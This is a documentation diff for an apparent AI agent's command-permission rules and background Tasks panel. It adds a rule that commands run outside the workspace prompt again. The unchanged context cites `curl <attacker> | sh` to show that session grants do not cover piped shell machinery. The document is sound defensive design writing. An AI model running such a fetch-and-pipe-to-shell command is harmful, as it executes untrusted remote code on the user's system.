@@ -207,6 +207,8 @@ Widening is offered **only** for a single plain invocation. Anything carrying sh
 
 Grants are session-scoped (`internal/session.State.PermissionCommandGrants`). Matching is deliberately stricter than for the operator-authored `tools.command_allowlist`: a session grant only ever covers a candidate command that is itself a single plain invocation. Trailing arguments stay covered, as they always were, but appending shell machinery does not — `curl <attacker> | sh` asks again even with a `curl` grant. The operator's own `tools.command_allowlist` keeps its documented prefix meaning.
 
+A grant approves a command, not the directory it runs in. A `run_command` whose `cwd` leaves the workspace (an absolute path elsewhere, or a relative one that climbs out with `..`) asks again even when its command is granted or allowlisted, and the prompt names that directory. Under `bypass` nothing asks, as before.
+
 ## HTTP surface
 
 | Method | Path | Purpose |
@@ -233,7 +235,7 @@ The panel is **docked inside the session**, to the right of the transcript, at `
 ![The Tasks panel opened from the control in the chat header: two running cards, and a finished command opened in place](../assets/background-tasks-header-opener-dark-1280.png)
 
 *The Tasks panel opened from the control in the chat header: a subagent and a command still running, and a finished build opened in place with its command, output and exit code*
-- A transcript tool row that started a task names itself a background run and shows the task's clock where an ordinary row shows its duration, plus **Open in Tasks** and **Stop** when expanded. It says nothing about how the run ended: the status, the estimate, the exit code and the error are read on the task's card in the panel, which is what **Open in Tasks** opens: the panel comes up with that card already open.
+- A transcript tool row that started a task names itself a background run and shows the task's clock where an ordinary row shows its duration. It says nothing about how the run ended: the status, the estimate, the exit code and the error are read on the task's card in the panel, which the **Tasks** control in the chat header opens.
 
 - A turn the agent was woken into shows nothing of its own, neither a user bubble nor a note: the answer follows the previous turn, and the bell on the task's card says what woke the agent ([Waking the agent](#what-the-woken-turn-looks-like)).
 
